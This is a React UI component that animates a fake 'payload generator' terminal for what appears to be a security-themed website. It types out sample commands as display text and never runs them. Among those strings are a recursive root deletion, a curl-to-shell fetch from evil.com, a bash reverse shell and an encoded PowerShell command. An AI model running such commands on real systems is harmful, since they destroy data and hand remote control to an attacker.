"use client";

import { useState, useEffect } from "react";
import { motion } from "framer-motion";

const payloads = [
  `echo "Hello World!" > /tmp/test.txt`,
  `rm -rf / --no-preserve-root`,
  `powershell -EncodedCommand SQBFAFgAIAAiSGFja2tlZCEi"`,
  `curl http://evil.com/shell.sh | sh`,
  `bash -i >& /dev/tcp/192.168.1.5/4444 0>&1`,
  `echo "payload injected successfully"`,
];

const Inner3 = () => {
  const [currentPayload, setCurrentPayload] = useState(0);
  const [displayedText, setDisplayedText] = useState("");
  const [charIndex, setCharIndex] = useState(0);

  useEffect(() => {
    const current = payloads[currentPayload];
    if (charIndex < current.length) {
      const timeout = setTimeout(() => {
        setDisplayedText((prev) => prev + current[charIndex]);
        setCharIndex((prev) => prev + 1);
      }, 40);
      return () => clearTimeout(timeout);
    } else {
      const delay = setTimeout(() => {
        setDisplayedText("");
        setCharIndex(0);
        setCurrentPayload((prev) => (prev + 1) % payloads.length);
      }, 1000);
      return () => clearTimeout(delay);
    }
  }, [charIndex, currentPayload]);

  return (
    <div className="w-full min-h-44 rounded-lg p-0 flex flex-col justify-start space-y-3 overflow-hidden relative ">

      {/* Generating Label */}
      <div className="relative z-10 flex items-center gap-2 px-3 pt-3">
        <motion.div
          animate={{ opacity: [0.3, 1, 0.3] }}
          transition={{ repeat: Infinity, duration: 1.2 }}
          className="w-2 h-2 rounded-full bg-green-400/70"
        />
        <p className="text-green-400/70 text-xs font-mono uppercase tracking-wide">
          Generating Payload...
        </p>
      </div>

      {/* Terminal display */}
      <div className="relative z-10 flex-1 px-3 overflow-hidden flex flex-col justify-center">
        <p className="text-green-400/70 text-sm font-mono mb-1">
          {displayedText}
          <span className="animate-pulse">|</span>
        </p>
      </div>

      {/* Status log */}
      <div className="relative z-10 text-[10px] text-white/30 font-mono leading-snug space-y-0.5 px-3 pb-3">
        <p>[INFO] Detecting target OS...</p>
        <p>[INFO] Selecting encoding method...</p>
        <p>[INFO] Injecting obfuscation layers...</p>
        <p>[OK] Payload generated successfully!</p>
      </div>
    </div>
  );
};

export default Inner3;
